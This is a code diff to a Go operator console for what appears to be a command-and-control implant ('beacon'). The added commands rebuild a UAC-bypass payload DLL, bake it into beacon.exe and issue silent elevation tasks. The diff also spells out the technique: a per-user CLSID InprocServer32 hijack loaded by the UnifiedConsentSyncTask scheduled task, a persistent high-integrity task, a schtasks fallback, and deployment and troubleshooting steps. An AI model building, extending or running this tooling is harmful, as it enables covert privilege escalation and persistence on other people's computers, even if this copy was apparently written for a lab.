@@ -11,6 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"time"
 	"unicode"
@@ -179,6 +180,10 @@ func (r *REPL) exec(ctx context.Context, line string) error {
 			return err
 		}
 		fmt.Fprintf(r.out, "sleep queued for %s: %s\n", args[0], t.ID)
+	case "uactest", "uac-test":
+		return r.uacTest(ctx, args)
+	case "uacdll", "payload":
+		return r.rebuildPayload(ctx, args)
 	case "watch":
 		if err := r.startWatch(ctx); err != nil {
 			return err
@@ -242,6 +247,9 @@ func (r *REPL) help() {
   results [sid]            list results
   kill <sid>               kill beacon
   sleep <sid> <seconds>    change beacon sleep interval
+  uactest <sid> [cmd]      issue a silent elevation test (method=daily) and watch for the result
+  uacdll [-SkipBeacon]     rebuild the uac payload DLL from pkg\beacon\uacdll\darts_ucd.c
+                        (then: package -Seed <seed> to bake it into a new beacon.exe)
   watch                    stream live events (type "stop" to exit)
   quit                     exit console
 `)
@@ -519,13 +527,143 @@ func (r *REPL) buildPackage(ctx context.Context, args []string) error {
 	}
 	cmd := exec.CommandContext(ctx, "powershell", cmdArgs...)
 	cmd.Dir = repoRoot
-	cmd.Stdout = r.out
+	var out bytes.Buffer
+	cmd.Stdout = io.MultiWriter(r.out, &out)
 	cmd.Stderr = r.out
 	fmt.Fprintln(r.out, "building package (this can take a minute)...")
 	if err := cmd.Run(); err != nil {
 		return fmt.Errorf("package build failed: %w", err)
 	}
+	if sid := packageSID(out.String()); sid != "" {
+		r.deployHint(sid)
+	}
 	return nil
+}
+
+var sidRe = regexp.MustCompile(`id=([0-9a-fA-F]{8,})`)
+
+// packageSID extracts the session id from the package script output (both the
+// "registered: sid=..." and the "POST /api/v1/sessions id=..." lines match).
+func packageSID(out string) string {
+	m := sidRe.FindAllStringSubmatch(out, -1)
+	if len(m) == 0 {
+		return ""
+	}
+	return m[len(m)-1][1]
+}
+
+// rebuildPayload compiles the uac payload DLL from C source and regenerates
+// the embedded byte array (pkg/beacon/uac_daily_dll.go). Only needed when
+// pkg/beacon/uacdll/darts_ucd.c changes; then bake it with: package -Seed <seed>.
+func (r *REPL) rebuildPayload(ctx context.Context, args []string) error {
+	script := "lab/rebuild-uac-dll.ps1"
+	if _, err := os.Stat(script); err != nil {
+		return fmt.Errorf("run the console from the repo root (%s not found): %w", script, err)
+	}
+	cmdArgs := []string{"-NoProfile", "-ExecutionPolicy", "Bypass", "-File", script}
+	for i := 0; i < len(args); i++ {
+		switch args[i] {
+		case "-SkipBeacon":
+			cmdArgs = append(cmdArgs, "-SkipBeacon")
+		case "-Gcc", "-gcc":
+			i++
+			if i >= len(args) {
+				return fmt.Errorf("usage: uacdll [-SkipBeacon] [-Gcc <path>]")
+			}
+			cmdArgs = append(cmdArgs, "-Gcc", args[i])
+		default:
+			return fmt.Errorf("unknown flag %q (usage: uacdll [-SkipBeacon] [-Gcc <path>])", args[i])
+		}
+	}
+	cmd := exec.CommandContext(ctx, "powershell", cmdArgs...)
+	cmd.Stdout = r.out
+	cmd.Stderr = r.out
+	fmt.Fprintln(r.out, "rebuilding the uac payload DLL (gcc + gen.ps1)...")
+	if err := cmd.Run(); err != nil {
+		return fmt.Errorf("payload rebuild failed: %w", err)
+	}
+	return nil
+}
+
+func (r *REPL) deployHint(sid string) {
+	fmt.Fprintln(r.out, "== deploy + test the silent uac channel ==")
+	fmt.Fprintln(r.out, "  1. copy lab\\laptop-pkg\\beacon.exe to the laptop and double-click it")
+	fmt.Fprintln(r.out, "  2. wait ~15s, then confirm check-in:  sessions")
+	fmt.Fprintf(r.out, "  3. test silent elevation:            uactest %s\n", sid)
+	fmt.Fprintln(r.out, "     (first result waits for the 12:00 daily sync fire; later ones return in seconds)")
+}
+
+// uacTest issues a silent uac task (method=daily) on a session and watches for
+// the result. If the channel is already bootstrapped the result arrives in
+// seconds; otherwise the console explains the daily fire wait and prints the
+// on-laptop verification checklist.
+func (r *REPL) uacTest(ctx context.Context, args []string) error {
+	if len(args) < 1 {
+		return fmt.Errorf("usage: uactest <sid> [cmd]")
+	}
+	sid := args[0]
+	cmd := "whoami /groups"
+	if len(args) > 1 {
+		cmd = strings.TrimPrefix(strings.Join(args[1:], " "), "cmd=")
+	}
+	fmt.Fprintf(r.out, "== issuing uac test (silent daily channel) on %s ==\n", sid)
+	fmt.Fprintf(r.out, "   command: %s\n", cmd)
+	t, err := r.client.IssueTask(ctx, sid, r.opID, "uac", map[string]string{"cmd": cmd}, r.opID)
+	if err != nil {
+		return err
+	}
+	fmt.Fprintf(r.out, "queued %s\n", t.ID)
+	fmt.Fprintln(r.out, "   first invocation waits for the UnifiedConsentSyncTask daily fire (12:00±2h, up to ~26h);")
+	fmt.Fprintln(r.out, "   if the channel is already bootstrapped the result returns in seconds.")
+	fmt.Fprintln(r.out, "watching for the result...")
+	deadline := time.Now().Add(60 * time.Second)
+	for time.Now().Before(deadline) {
+		results, err := r.client.Results(ctx)
+		if err != nil {
+			return err
+		}
+		for _, res := range results {
+			if res.TaskID != t.ID {
+				continue
+			}
+			if res.Error != "" {
+				fmt.Fprintf(r.out, "result: error=%q\n", res.Error)
+			} else {
+				fmt.Fprintln(r.out, "== elevated output ==")
+				fmt.Fprintln(r.out, prettyOutput(res.Output))
+			}
+			r.uacChecklist()
+			return nil
+		}
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case <-time.After(2 * time.Second):
+		}
+	}
+	fmt.Fprintln(r.out, "no result within 60s — the channel is waiting for the next daily fire.")
+	r.uacChecklist()
+	r.uacTroubleshooting()
+	return nil
+}
+
+func (r *REPL) uacChecklist() {
+	fmt.Fprintln(r.out, "== verify the channel on the laptop ==")
+	fmt.Fprintf(r.out, "  type %%TEMP%%\\uc_daily_marker.txt       # \"il=1\" = loaded at HIGH, last line \"done\"\n")
+	fmt.Fprintf(r.out, "  schtasks /query /tn \\DarkArts-uac     # the bootstrapped HIGHEST task\n")
+	fmt.Fprintf(r.out, "  reg query \"HKCU\\Software\\Classes\\CLSID\\{82AA0895-198A-4C1B-B2D1-C16894218AFB}\\InprocServer32\"\n")
+	fmt.Fprintf(r.out, "                                        # -> %%TEMP%%\\darts_ucd.dll\n")
+	fmt.Fprintln(r.out, "  afterwards the channel is instant: task <sid> uac cmd=...  (or uactest <sid>)")
+}
+
+func (r *REPL) uacTroubleshooting() {
+	fmt.Fprintln(r.out, "== if there is still no result after the daily fire ==")
+	fmt.Fprintln(r.out, "  - the laptop user must be logged on (runs in the interactive session)")
+	fmt.Fprintf(r.out, "  - schtasks /query /tn \\Microsoft\\Windows\\ConsentUX\\UnifiedConsent\\UnifiedConsentSyncTask  (Last Run Time)\n")
+	fmt.Fprintf(r.out, "  - %%TEMP%%\\uc_daily_marker.txt missing -> DLL never loaded (CLSID override deleted?)\n")
+	fmt.Fprintln(r.out, "  - marker shows il=0                  -> activated at low integrity")
+	fmt.Fprintln(r.out, "  - immediate fallback (one prompt):   task <sid> uac method=schtasks cmd=whoami /groups")
+	fmt.Fprintln(r.out, "  - Win10 (no UnifiedConsentSyncTask): use method=schtasks")
 }
 
 func (r *REPL) listSessions(ctx context.Context) error {
